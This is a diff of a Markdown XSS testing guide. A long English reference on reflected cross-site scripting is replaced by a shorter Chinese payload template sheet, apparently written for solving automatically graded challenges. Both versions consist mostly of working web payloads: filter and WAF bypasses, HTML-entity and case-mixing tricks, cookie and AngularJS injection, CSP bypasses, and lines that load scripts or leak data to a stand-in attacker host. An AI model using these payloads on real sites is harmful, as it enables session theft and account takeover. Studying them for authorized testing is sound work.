@@ -1,170 +1,70 @@
-# Reflection XSS
+# Reflection XSS 测试与绕过
 
-## Input points to enumerate
-- Query params incl. duplicates `a=1&a=2`, arrays `a[]=1`, matrix/path params `/x;<payload>` — frameworks pick first vs last differently. HPP: `?a=<svg>&a=onload=alert(1)>`, try param name + value, semicolon delimiters.
-- Path segments / route params `/user/<name>`, 404 pages, error/stack-trace pages, search, pagination/sort.
-- All form fields — hidden, disabled, unchecked, and fields the UI never submits.
-- Headers echoed back: `Referer`, `User-Agent`, `Cookie`, `Origin`, `Accept*`, `Host`, `X-Host`, `Forwarded`, `X-Forwarded-Host`, `X-Forwarded-For`, `X-Forwarded-Proto`, `X-Forwarded-Prefix`, `X-Forwarded-Scheme`, `X-Forwarded-Port`, `X-Forwarded-Server`, `X-Real-IP`, `X-Original-URL`, `X-Rewrite-URL`, `X-HTTP-Method-Override`, `X-Requested-With`, `Via`, `X-Api-Version`, `X-Client-IP`, `X-ProxyUser-IP`.
-- Cookies (incl. `Set-Cookie` values rendered later), JSON body fields landing in HTML, uploaded/downloaded filenames, `Content-Disposition`.
-- Redirect targets: `Location`, `<meta refresh>`, JS-built `location`, `returnUrl`/`next`/`redirect_uri`/`continue`.
-- Email/notification templates, "share this" previews, contact-form confirmations, ticket/support descriptions, admin log viewers, analytics panels.
-- Head reflections (`<meta>`, `<title>`, `<link rel=stylesheet>`, `<base>`, canonical/`og:url`) — same page, often a different encoding path than the body.
-- Client-only sources: `location.hash`/`search`/`pathname`/`href`, `document.URL`, `document.referrer`, `document.baseURI`, `window.name` (survives cross-origin navigation), `postMessage` data, `localStorage`/`sessionStorage`, `history.state`, `document.cookie`.
+## 1. 确认回显上下文
+- 提交 `"><h1>x</h1>` 判断是否可闭合标签；提交 `"><img src=x>` 判断是否过滤尖括号/引号。
+- 记录回显位置：标签之间的文本、属性值（单/双/无引号）、URL/href、JS 变量、Angular 表达式等。
 
-## Probe workflow
-1. One unique canary per input point (`xsstest12345` + per-param suffix) to attribute each reflection.
-2. Compare raw response (curl / view-source) vs rendered DOM. DOM-only = client-side sink; trace source to sink.
-3. Char probe `' " < > / \ & { } ( ) ` ; : =` — record per char: raw / entity-encoded / stripped / backslash-escaped / uppercased / truncated / double-encoded.
-4. Length 20 / 200 / 2000 chars: find cutoff and whether truncation lands before or after injection point. Put payload first if trailing truncation.
-5. Decode depth: `%3c`, `%253c`, `&#x3c;`, `%26%23x3c%3b`, `&lt;`, mixed case; count passes before reflection.
-6. Read surrounding bytes, pin exact context, build minimal payload for that context only.
-7. Fire in real browser with console open; confirm execution, not string presence. Console errors hint at parsing failure.
-8. Check `Content-Type` + charset, `X-Content-Type-Options: nosniff`, CSP tokens, `Vary`.
-9. Same input can reflect multiple times in different contexts — break out of the first to reach the second. If all reflections land inside quoted attributes and `<`/`>` are encoded so no tag breakout, treat each URL attribute (`href`/`src`/`action`) as a potential `javascript:` click-XSS candidate and check for backend string filters on protocol/scheme.
-10. Feed the same payload twice (two params, param + header, param + cookie, repeated `a=1&a=2`, param name + value) — second reflection can close a tag the first opened.
-11. Same reflection may also be SSTI (`{{7*7}}`, `${7*7}`) or SQLi — note it, don't lose finding.
+## 2. 属性值注入模板
+- 双引号属性：`"><img src=x onerror=alert(1)>` 或闭合 value 注入属性：`" autofocus onfocus=alert(1) x="`。
+- 单引号属性：`'><img src=x onerror=alert(1)>` 或 `' autofocus onfocus=alert(1) x='`。
+- 无引号属性：`x onmouseover=alert(1)` 或 `x onfocus=alert(1) autofocus`。
+- 必须考虑触发条件：优先自动触发事件 `onerror/onload/onscroll`；`onmouseover/onfocus` 需要交互，自动化判分环境可能不触发。
+- 当原始元素为 `<input type=hidden>` 时，先闭合 value 并注入 `type="image" src="x" onerror="alert(1)"`，新声明的 type 会覆盖原有 hidden 属性，img 加载失败自动触发 onerror。若原标签还有 `type=hidden` 在 payload 之后，保持注入的 type 在前即可生效。
+- 属性内无法闭合时，尝试在属性值内使用编码引号或空白拆分。
 
-## Context → minimal payload
+## 3. 关键字过滤绕过
+### 3.1 大小写混合
+- 若服务端过滤大小写敏感，转换事件名/协议/属性名字母大小写：`OnErRoR`、`OnMoUsEoVeR`、`hRef`、`sCrIpT`。
+- 属性名与事件名在 HTML 解析中不区分大小写，但服务端字符串替换区分。
+- 模板：`"><img src=x OnErRoR=top['al'+'ert'](1)>`
+- 模板：`"><a hRef="javaScript:top['al'+'ert'](1)">x</a>`
 
-### HTML text / free tag position
-- `<script>alert(1)</script>`; if dead: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`.
-- Unclosed tag at EOF can fire: `<img src=x onerror=alert(1)` (no `>` needed if input is truncated/filtered but document ends).
-- No interaction: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `<details open ontoggle=alert(1)>`, `<input autofocus onfocus=alert(1)>`, `<select autofocus onfocus=alert(1)>`, `<textarea autofocus onfocus=alert(1)>`, `<xss autofocus tabindex=1 onfocus=alert(1)>`, `<video><source onerror=alert(1)>`, `<audio src=x onerror=alert(1)>`, `<marquee onstart=alert(1)>`, `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`, `<body onload=alert(1)>` (if body tag unclosed/open).
-- Click required, survives most filters: `<x onclick=alert(1)>x</x>`, `<a href=javascript:alert(1)>a</a>`, `<svg><a xlink:href=javascript:alert(1)>x</a>`.
+### 3.2 HTML 实体编码（拆分关键字）
+- 将敏感字 `script`、`on` 中的字符用 HTML 数字字符引用替换，服务端过滤时看到的字面量不连续，但浏览器解析属性值后恢复。
+- 常用映射：`s` 对应 `&#115;`，`o` 对应 `&#111;`，`n` 对应 `&#110;`，冒号可用 `&colon;` 或 `&#58;`。
+- 模板（href 协议）：`java&#115;cript:alert(1)` 或 `java&#x73;cript:alert(1)`
+- 模板（事件名）：`o&#110;error=alert(1)` 可绕过 `on` 子串替换，但注意属性名解析实体后为 `onerror`。
+- 模板（带 URL 编码传输）：将 `&` 编码为 `%26`，`#` 编码为 `%23`，例如发送 `java%26%23115%3Bcript:alert(1)`；服务器 URL 解码后得到 `java&#115;cript:alert(1)` 再写入 HTML。
 
-### Attribute contexts
-- Double-quoted: `"><img src=x onerror=alert(1)>`; if `>` filtered: `" onmouseover=alert(1) x="` / `" autofocus onfocus=alert(1) x="`.
-- Single-quoted: `'><svg onload=alert(1)>`, `' onmouseover=alert(1) x='`, `' autofocus onfocus=alert(1) x='` (when `<`/`>` are entity-encoded so tag breakout impossible but single quote is not escaped, inject an event attribute inside the value — no `>` needed; `autofocus onfocus` fires immediately on focusable elements like `<input>`/`<select>`/`<textarea>`).
-- **Unquoted attribute: quotes are literal, never break out.** Use whitespace or `>` to end value: ` onmouseover=alert(1) `, ` autofocus onfocus=alert(1)`, `><script>alert(1)</script>`. Entities decode into value, don't affect tokenizer.
-- Attribute name position (inside open tag): ` x onload=alert(1) ` — needs leading space; if glued to tag name, close tag first. Attribute names are lowercased, so case filters only.
-- Slash as separator when spaces filtered: `<svg/onload=alert(1)>`, `<script/src=//attacker.tld/x>`. **But in tag attribute separation, `/` is NOT a valid whitespace separator — it gets parsed as part of the attribute name. Use `%0a`, `%09`, `%0c`, `&Tab;`, or `&NewLine;` instead.** 
-- Existing `on*` string value: `';alert(1)//`, `'-alert(1)-'`; if both quotes escaped, use `</script>` breakout or close tag.
-- Existing `<script src="…">`: set `src="//attacker.tld/x"` and serve JS.
-- `href`/`src`/`action`/`formaction`/`data`/`poster`/`xlink:href`: `javascript:alert(1)`, `javascript:alert(1)//`, `javascript&colon;alert(1)`; `<form action=javascript:alert(1)><input type=submit>`, `<button formaction=javascript:alert(1)>x`, `<base href=//attacker.tld/>` to hijack relative `<script src>`/`<a href>`. `iframe src=javascript:`/`object data=javascript:` are inconsistent across browsers — only report after confirmed execution.
-  - When the reflected value lands inside a double-quoted URL attribute and quotes/`<`/`>` are all escaped so tag breakout is impossible, treat the URL attribute itself as the sink: `javascript:alert(1)` requires a click but is still XSS. Backend `strtolower` + keyword substitution (e.g. `script`→`scr_ipt`, `on`→`o_n`, `href`→`h_ref`, `data`→`d_ata`) defeats case mixing; bypass with HTML entities for key letters: `java&#115;cript:alert(1)` (decimal `&#115;` = s), `jav&#x61;script:alert(1)` (hex `&#x61;` = a), `&#106;avascript:alert(1)` (decimal `&#106;` = j). The browser decodes entities in attribute values before scheme parsing. If the app also requires the value to contain `http://` to accept/sanitize the link, append `//http://` as a JS comment: `java&#115;cript:alert(1)//http://`.
-- `data:text/html;base64,…` / `data:text/html,<script>…`: top-level navigation to `data:` blocked; useful in `iframe`/`object`/`embed` or script assignment.
-- `srcdoc`: `<iframe srcdoc="<script>parent.alert(1)</script>">` — literal `<` in quoted attr is legal; `&lt;script&gt;…` also works. Requires no sandbox without `allow-scripts`, inherits parent CSP.
-- `style="…"`: `javascript:` in `url()` dead in modern browsers; use CSS exfil or break out.
+### 3.3 JS 内部字符串拆分
+- 在事件处理器或 Angular 表达式中，使用字符串拼接绕过对 `alert`、`document`、`prompt` 等字面量过滤。
+- 模板：`top['al'+'ert'](1)`、`top["pr"+"ompt"](1)`、`self['doc'+'ument']['domain']`
+- 将上述嵌入事件属性：`"><img src=x onerror=top['al'+'ert'](1)>`
 
-#### Hidden/immutable input contexts
-- If the injection point is inside `<input type="hidden" value="...">`, events like `onmouseover`/`onfocus` will never fire because the element is hidden. **First inject `type="image"` (or `type="text"` + `autofocus onfocus`), then attach the event: `" type="image" src=x onerror=alert(1) x="`.** `type="image"` with broken `src` fires `onerror` automatically. This is often faster than trying to interact with hidden elements.
-- In `value="..." type="hidden"` reflections, if the quotes allow breakout but `type=hidden` kills events, always try to overwrite `type`.
+### 3.4 URL 编码/双重编码
+- 测试服务端过滤发生在 URL 解码前还是后：若过滤在解码后，尝试双重编码 `%2573`（s 的二次编码）使服务端解码一次后仍为 `%73` 不匹配，后续浏览器再解码成 s。
+- 用 `%26` 传 `&`、`%23` 传 `#`，使服务端接收后保留 HTML 实体语法。
 
-#### Event-handler JS string escapes
-- When the reflection lands inside an inline event handler's JS string (e.g. `onclick="track('REFLECTION')"`) and the server escapes single quotes with a backslash (`\'`) or double quotes with HTML entities, **remember that HTML entities in attribute values are decoded before JavaScript parsing.** Inject `&apos;` (or `&#39;`, `&#x27;`) to produce a raw single quote inside the JS string, bypassing the backslash escape. Template: `&apos;-alert(1)-&apos;` (or `&apos;+alert(1)+&apos;`). After HTML parsing the attribute becomes `track(''-alert(1)-'')`, which executes `alert(1)` as part of the expression. Works even when the server escapes both `'` and `\`, because the entity is not touched.
+## 4. Cookie 注入（隐蔽输入点）
+- 插入点来自 Cookie 值时，直接修改请求 Cookie 头为 payload，无需先通过 Set-Cookie 设置。
+- 若服务端每次响应都会 Set-Cookie 覆盖该值，避免多步操作：确保同一次请求携带恶意 Cookie；如果确实要分两步，第二步请求的 Cookie 头不能受第一步响应体的 Set-Cookie 影响。
+- Cookie 值字符限制：不允许 `;`、空格、换行等；需要 URL 编码 `"` 等特殊字符。
+- 在 Cookie 中构造属性注入 payload：`" type="image" src="x" onerror="alert(1)` 或 `"/type="image"/src="x"/onerror="alert(1)`，利用 image 触发无需交互。
+- 注意 Cookie 值中 `%22` 解码为 `"`，`%0d%0a` 可能被忽略。
 
-### Script context
-- JavaScript string single-quoted: `';alert(1)//`, `'-alert(1)-'`; double-quoted: `";alert(1)//`; backslash-escaped: `\';alert(1)//`.
-- Non-string: `1;alert(1)//`, bare `alert(1)`; template literal: `${alert(1)}`; regex: `/;alert(1)//`; line comment: prepend `%0a`.
-- `</script>` breakout works everywhere in `<script>` — string, comment, regex. Variants: `</script><script>alert(1)</script>`, `</script >`, `</script/x>`, `</script/>`, `</script foo=bar>`, `</ScRiPt>`, `</script\t>`. `</scriptx>` does not close.
-  - One-pass `</script` stripping: preceding `<!--` puts tokenizer into script-data-escaped state; following `<script` into double-escaped state where `</script>` no longer closes — add extra `</script>`.
-- JSON.stringify output inside `<script>` — JSON doesn't escape `<`, `>`, `/`: `"</script><script>alert(1)</script>"`. `\u2028`/`\u2029` breakouts dead since ES2019.
-- `JSONP`: `/api?callback=alert(1)//` → `<script src="/api?callback=alert(1)//">`; also CSP whitelist bypass.
-- **When `(` and `)` are filtered but you are inside a JS string (e.g. `javascript:` URL or script block), don't force direct calls.** Try:
-  - Tagged template: `alert\`1\`` (fires alert with argument `1`). Also `setTimeout\`alert\`1\``.
-  - Assign to `onerror` and trigger it: `onerror=alert;throw 1` — `throw` executes and fires the global `onerror` handler.
-  - Use `toString`/`valueOf` implicit call hooks: `toString=alert,window+''` or `x={toString:alert},x+''`.
-  - Arrow-function + comma + throw chain (when `{}` and `=>` allowed): `x=x=>{throw/**/onerror=alert,1337}`.
-  - Always verify in console which characters survive and which JS features are available.
+## 5. AngularJS / ng-include 场景
+- 输入进入 `ng-include` 的 src 表达式时，尝试闭合 Angular 字符串并指向同源 URL，该 URL 返回包含可执行 HTML 的内容。
+- 模板：`'SAME_ORIGIN_URL?param=<img src=x onerror=top["pr"+"ompt"](1)>'`，令 Angular 表达式求值为该 URL，然后 ng-include 加载并编译 `param` 中的 HTML。
+- 若表达式过滤 `alert` 等，使用 `top["pr"+"ompt"](1)` 绕过。
+- AngularJS 1.2.0 经典沙箱绕过的 `constructor.constructor` 可能失败，优先使用 ng-include 加载 HTML 或 `top["p"+"rompt"](1)` 一类的 window 引用。
 
-### Comments / raw text / foreign content
-- HTML comment: `--><img src=x onerror=alert(1)>`, `--!><script>alert(1)</script>`.
-- RCDATA `<textarea>`/`<title>`: `</textarea><img src=x onerror=alert(1)>`, `</title><svg onload=alert(1)>`.
-- RAWTEXT `<style>`, `<xmp>`, `<noembed>`, `<noframes>`, `<noscript>` with JS on: close element then tag. `<plaintext>` swallows rest.
-- `<template>`: inert container; break `</template><img src=x onerror=alert(1)>`.
-- `<noscript>` parses differently JS on/off → mXSS: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`.
-- SVG context: `<svg><script>alert(1)</script>`, `<svg><script href=data:,alert(1)>`, `<svg><a xlink:href=javascript:alert(1)>x</a>`, `</svg><img src=x onerror=alert(1)>`. SVG tolerates unquoted/odd attributes and self-closing. `<svg><foreignObject><iframe srcdoc=...>` works.
+## 6. 快捷 payload 速查
+- 基本双引号逃逸：`"><svg onload=alert(1)>`
+- 闭合 input 添加事件：`" autofocus onfocus=alert(1) x="`（可用于可交互 input）
+- 无交互 input 触发：`" type="image" src="x" onerror="alert(1)`
+- href + 大小写绕过：`"><a hRef="javaScript:alert(1)">x</a>`
+- href + HTML 实体绕过 script 过滤：`java&#115;cript:alert(1)`
+- href + URL 编码实体：`java%26%23115%3Bcript:alert(1)`
+- 事件名大小写绕过 on 过滤：`"><img src=x OnErRoR=top['al'+'ert'](1)>`
+- JS 内拆分 alert：`top['al'+'ert'](1)`
+- Cookie 属性注入：`" type="image" src="x" onerror="alert(1)`
+- Angular ng-include：`'path/file.php?name=<img src=x onerror=top["pr"+"ompt"](1)>'`
 
-### CSS / style
-- `</style><img src=x onerror=alert(1)>`; if `<` blocked use CSS-only exfil: `}body{background:url(//attacker/?x)}`, `@import'//attacker.tld/x'`, `<link rel=stylesheet href=//attacker.tld/x>`.
-- Attribute-value exfil chain without JS: `input[value^="a"]{background:url(//attacker/a)}`.
-- `style="…"` `javascript:` dead; use CSS exfil or break out to tag.
-
-### DOM sinks
-- `innerHTML`/`outerHTML`/`insertAdjacentHTML`/`document.write`/`Range.createContextualFragment`: `<img src=x onerror=alert(1)>`; `document.write` during parse may need `</script>` first.
-- `eval`/`setTimeout(string)`/`setInterval(string)`/`Function`: `alert(1)` (blocked by CSP without `'unsafe-eval'`).
-- `$(…)`/`$.html()`/`$.append()`: `<img src=x onerror=alert(1)>`, `#<img src=x onerror=alert(1)>` (jQuery <3.5 treats leading `#` selector as HTML).
-- `.attr('href', v)` / `location = v` / `location.assign|replace`: `javascript:alert(1)`, `#javascript:alert(1)`.
-- `script.src = v` / `iframe.src = v`: `//attacker.tld/x.js`; hash-controlled `#//attacker.tld/x.js`.
-- `localStorage`/`sessionStorage`/`history.state`/`document.cookie` read into sink.
-- `postMessage` without origin check: from console `win.postMessage('<img src=x onerror=alert(1)>','*')`.
-- AngularJS present (`ng-app`): `{{constructor.constructor('alert(1)')()}}` works on ≤1.5 as sandbox escape; 1.6+ removed sandbox — test `{{1+1}}` first. Vue `v-html` / React `dangerouslySetInnerHTML` sinks take raw HTML.
-- **AngularJS + strict CSP (no inline scripts, no `'unsafe-eval'`)**: Angular's own expression parser is not blocked by CSP; you can use Angular directives with expression to execute arbitrary JS. Try injecting an element with a directive that triggers automatically:
-  - `<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'>` and then navigate with `#x` to autofocus the input. The `orderBy` filter evaluates the supplied expression string, achieving code execution without `eval`.
-  - Other directives: `ng-init`, `ng-click` (needs click), `ng-mouseenter`; combine with URL fragment for automatic focus.
-  - Always test `{{1+1}}` first; if Angular is active, expression injection beats HTML tags.
-- Head reflections: `<title></title><script>alert(1)</script>`, `</title><img src=x onerror=alert(1)>`, `"><script>…` inside `<meta content="…">`.
-
-## Filter & WAF bypass
-- `<script>` blocked → event-driven tags, `<svg/onload=alert(1)>`, `<a href=javascript:alert(1)>`, `srcdoc`.
-- `on\w+=` blocked → `<svg><script>alert(1)</script>`, `javascript:` URL attributes, `srcdoc`. When `on*` and `<script` are both string-substituted/filtered but `<` and `>` pass through unchanged, use a `data:` URL to embed a full script without `<script>` in the raw payload: `<iframe src="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">`, `<object data="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">`, `<embed src="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">`. URL-encode `<script>`/`</script>` as `%3Cscript%3E`/`%3C/script%3E` to dodge keyword filters; the browser decodes inside the iframe/object and executes. `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">` also works when the reflected value is an HTML attribute.
-- **When `on` is globally replaced (e.g. `on`→`o_n`) and `<script` is replaced (e.g. `<script`→`<scr_ipt`) but `<`/`>` remain: avoid all event handlers and script tags entirely. Use `<iframe src="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">` or `<object data="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">`. The `data:` URL payload does not contain the literal characters `on` or `<script`, so the filter leaves it unmodified.** Same approach applies when only `on` is filtered but `script` is not, but `script` tag is blocked by other means.
-- Quotes blocked → unquoted attribute `<img src=x onerror=alert(1)>`, ` onmouseover=alert(1) `.
-- Parentheses blocked → entities in handler values are decoded: `<svg onload=alert&#40;1&#41;>`; named entities `&lpar;`/`&rpar;`; tagged template ``onload=alert`1` ``; `<svg onload=alert;throw 1>`.
-- `<` and `>` blocked → stay in JS/URL context: `alert(1)`, `javascript:alert(1)`, or `%3c`/`%253c`/`&#x3c;` if decode pass after filtering.
-- `>` only blocked → omit it: `<img src=x onerror=alert(1)` (EOF closes tag).
-- Spaces blocked → **never use `/` as attribute separator; it is not parsed as whitespace in HTML.** Use tab, `%0a`, `%0c`, `/**/`, `&Tab;`, `&NewLine;`. Example: `<img%0asrc=x%0aonerror=alert(1)>`. If the server replaces spaces with `&nbsp;`, that entity decodes to a non-breaking space `\u00a0`, which does NOT separate HTML attributes — switch to newline/tab.
-- `javascript:` blocked → `JaVaScRiPt:`, `java\tscript:`, `jav&#x0a;ascript:`, `jav&#x61;script:`, `&#106;avascript:`, `javascript&colon;alert(1)`, `//attacker.tld`. If the backend lowercases before matching keywords, case mixing is useless; instead HTML-encode key letters: decimal `&#115;` = s, hex `&#x73;` = s, un-semicoloned `&#115` also works — `java&#115;cript:alert(1)`, `jav&#x61;script:alert(1)`, `&#106;avascript:alert(1)`. The browser decodes numeric entities in attribute values before the scheme is interpreted. If the app additionally requires the value to contain `http://` for link validation, append `//http://` as a JS comment after the payload.
-- `alert` blocked → `prompt(1)`, `confirm(1)`, `print()`, `(alert)(1)`, `top['al'+'ert'](1)`, `\u0061lert(1)`, `[].constructor.constructor('alert(1)')()`, `globalThis['al\u0065rt'](1)`.
-- Keyword blocklist on `script` → `<ScRiPt>`, `<scr<script>ipt>`, `<script x>`, `script\nsrc=`, `<script/src=//x>`.
-- Named entities to dodge `%`/`&#x` filters: `&colon;`, `&sol;`, `&Tab;`, `&NewLine;`, `&lpar;`/`&rpar;`.
-- Single-pass token removal → `<scr<script>ipt>alert(1)</scr</script>ipt>`; if filter loops to empty, look for double-write reconstitution (`<sc<script>ript>`).
-- mXSS: `<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">`, `<svg></p><style><g title="</style><img src=x onerror=alert(1)>">`, `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`, `<template>` moved between contexts.
-- Length limit → `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`; bolt handler onto existing tag.
-- Truncation → payload first; never rely on trailing `</script>` or closing quote.
-- HPP, double-encoded body (`%253c`), multipart part name, `X-HTTP-Method-Override`, method switch, body field names vs values.
-- Legacy multi-byte charsets (GBK/Shift_JIS/EUC-JP) with trailing-byte escape: `%bf%5c` eats backslash. Only old apps; UTF-7 and overlong UTF-8 dead.
-
-## Sanitizer fingerprints → what to try
-- `htmlspecialchars` default `ENT_COMPAT` (only `"` escaped) → single-quoted attr breaks: `' onmouseover=alert(1) x='`, `' autofocus onfocus=alert(1) x='`. `ENT_QUOTES` both quotes escaped → unquoted attr or numeric entity bypass.
-- `addslashes` as HTML escaping → backslash literal, quote still closes: `"><img src=x onerror=alert(1)>`.
-- `strip_tags` → keeps attributes of allowed tags; inject into allowed tag's attribute or stray `<`.
-- Case-sensitive `str_replace` → `<ScRiPt>`, `OnErRoR=`.
-- Decode order: filter after decoding → `&#x3c;` blocked; filter before browser decode → `&#x3c;script&#x3e;` lands live.
-- **Entities never decode inside `<script>`** — `&quot;`/`&lt;` stay literal. They decode in text nodes and attribute values → `&#x3c;` is real `<`, `&colon;` is `:`. In event-handler attributes, entity decoding happens before the JavaScript engine parses the handler code, so `&apos;` becomes `'` and bypasses JS-string escaping.
-- Server output + reachable DOM sink = double-decode XSS: single-encoded reflection + `innerHTML`/`eval`/`$.html()`.
-- Sanitizer output re-parsed by client is mXSS fingerprint — look for cached sanitized HTML that gets re-serialized.
-- DOMPurify/Trusted Types: check version, `ADD_ATTR`/`ALLOW_UNKNOWN_PROTOCOLS`/`ALLOWED_URI_REGEXP`, and whether `require-trusted-types-for 'script'` enforced. TT kills most HTML sinks unless policy exposes `createHTML` passthrough.
-- Framework raw output: `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, `{{{ }}}`, `<%= raw %>`, `|safe`, `|raw`, `Markup()`, `mark_safe`, `ng-bind-html`.
-- DOM clobbering where sink reads by `id`/`name`: `<a id=x><a id=x name=y href=//attacker.tld>`.
-
-## Execution constraints: quick check before burning time
-- Read real response: `Content-Type`, `X-Content-Type-Options: nosniff`, CSP `script-src` nonce/hash `strict-dynamic`, Trusted Types.
-- No `script-src`, or `'unsafe-inline'` → all inline vectors work.
-- Without `'unsafe-inline'` every `on*=` and `javascript:` is blocked; payload set collapses to `<script src>` allowed host or nonce-bearing script.
-- `script-src 'self'` → JSONP endpoint, same-origin upload, same-origin library, or `<base href=//attacker.tld/>` + relative `<script src>` if `base-uri` unset.
-- Nonce present → nonce reuse across responses, nonce injectable via reflection, or pivot to DOM sinks.
-- `strict-dynamic` + whitelist → find whitelisted host with JSONP/upload gadget.
-- `base-uri` unset → base hijack. `form-action` unset → `javascript:` in form action. `object-src` unset → `<object>`/`<embed>`.
-- `require-trusted-types-for 'script'` → HTML sinks die unless policy passthrough.
-- Report-Only CSP → payloads still run.
-- **If CSP blocks all script execution but you have HTML injection inside a `<form>`**: don't chase JS execution. Inject a submit button (`"><button type="submit">Click</button>`) or change form behavior (`type="submit"` on an existing input). Form hijacking can exfiltrate data or trigger CSRF without JavaScript. Only works if the reflection lands inside a form and user interaction is plausible.
-
-## Cases that change payload
-- **Header reflection** executes in whatever later renders that header — effectively stored: canary first, then `//attacker.tld/?x`. Only report if victim request can carry value: `User-Agent`/`Referer`/`Origin` via link/form/redirect; `X-Forwarded-Host`/`Host` via proxy/cache.
-- **Header → cache poisoning**: `X-Forwarded-Host`/`Host` reflected into cached HTML turns reflected into stored. Check `Vary`, unkeyed headers, cache key.
-- **Header → response splitting**: `%0d%0a` in echoed header, inject `Content-Type: text/html` + body.
-- **Dangling markup** (no JS): `<img src='//attacker.tld/?`, `<textarea>`, `<a href='//attacker.tld/?` leak following bytes (CSRF token, PII).
-- **JSON body rendered as HTML** or embedded in `<script>`: `{"x":"</script><script>alert(1)</script>"}`.
-- **`<script type="application/json">` blob** read into `innerHTML`: put `</script><script>alert(1)</script>` inside JSON string; safe alone.
-- **`Content-Type: application/json` + no nosniff** — modern browsers do not sniff to HTML. Only `text/html`, absent/unknown content type, or framed/`document.write`-ed response worth pursuing. `text/plain` no longer sniffed. Don't report bare header combo.
-- **Split reflection across two params/headers** — one closes tag, other supplies handler.
-- **Different origin reflection** — prove with `alert(document.domain)`.
-- **`Location:` reflection** is open redirect, not XSS; `javascript:` there is not honored.
-- **Upload/download responses** — filename in `Content-Disposition` or inline `<a href>`; SVG/HTML/PDF served inline = stored XSS.
-- **Email/notification templates** — payload runs in mail client/webmail preview; check raw MIME escaping.
-- **Reflection into `<script src>` query string** — often JSONP gadget: try `callback`, `cb`, `jsonp`, `_callback`, `jsoncallback`.
-- **Reflection into attribute read later by JS** (`data-*`, `value`, `title`) → second-order into client-side sink; trace reader.
-- **Multiple attribute sinks with no tag breakout** — if the same input reflects into `<input value="...">`, `<a href="...">`, etc., and all are double-quoted with `<`/`>` entity-encoded, don't keep hunting for `>`; the `href`/`src`/`action` attribute itself is the sink. Inject `javascript:alert(1)` and require a click. Bypass backend `strtolower`+keyword substitution with HTML entities for key letters, and satisfy `http://` validation with `//http://` as a trailing JS comment.
-- **`window.name` source** — attacker sets `window.name = '<img src=x onerror=alert(1)>'` then navigates; check if victim reads into sink.
-- **Reflection into CSP response headers** (e.g. `report-uri /csp-report?token=`, `report-to`, `policy-uri`, `nonce`): try injecting a semicolon to add a new directive, e.g. `;script-src-elem 'unsafe-inline'` or `;script-src 'unsafe-inline'`. CSP directives are separated by `;`, so an unfiltered token inside a directive can override the whole policy. After injecting the policy change, your original script/event payload (using another reflection) will execute. Check whether the server URL-decodes or reflects the parameter into the CSP header without sanitizing `;` and whitespace. This is often easier than CRLF header injection.
-
-## Verification and false positives
-- Prove origin with `alert(document.domain)`; `alert(1)` fine for PoC. Never exfiltrate real user cookies.
-- Three states: **reflected raw** / **reflected and encoded** (not exploitable as-is) / **reflected and executable**. Most false positives are first two.
-- Entity-encoded quotes inside attribute (`value="&quot;…"`) are decoded for display but never close attribute; same for `&lt;`/`&gt;` in attr. Not breakout. However, numeric entities in a URL attribute value do decode to the scheme: `java&#115;cript:` is treated as `javascript:` after parsing.
-- Payload only inside JS string, `<title>`/`<textarea>`, HTML comment, or after truncation does not execute.
-- Reflection without `Content-Type: text/html` (covered by nosniff, or `json`/`text/plain`) is not XSS modern browsers.
-- Re-test exact curl request vs browser-rendered page — proxies/WAFs rewrite one. Re-test with cache bypass (`?x=1`) and fresh extension-free profile.
-- Self-only reflection: confirm attacker-controllable via link/form/header; look for GET variant of POST-only reflection.
-- Final PoC must run in target real context (origin, auth); capture exact reproducing request. Use devtools console; console errors may indicate parsing failure.
+## 7. 判分失败排查
+- 产生 payload 后，在无交互 headless 浏览器中执行，确认自动触发。
+- 若 payload 依赖 onmouseover/onfocus 且测试环境无交互，换用 onerror/onload。
+- 若 on 被替换为 o_n，检查是否使用了大小写混合绕过，或导致属性名无效。
+- 若 script 被替换，尝试 HTML 实体编码拆分关键字；注意服务端过滤可能发生在 URL 解码后，用 `%26%23115%3B` 传输。
+- 若在 `<a href>` 中直接提交 `javascript:...` 被过滤，检查是否可先闭合 `<a>` 或注入新标签。
+- 若 Cookie payload 未触发，确认 Cookie 值传输时是否被 URL 解码影响分句；避免使用分号。
+- 若 Angular 沙箱 payload 无效，改用 ng-include 加载同源 HTML。
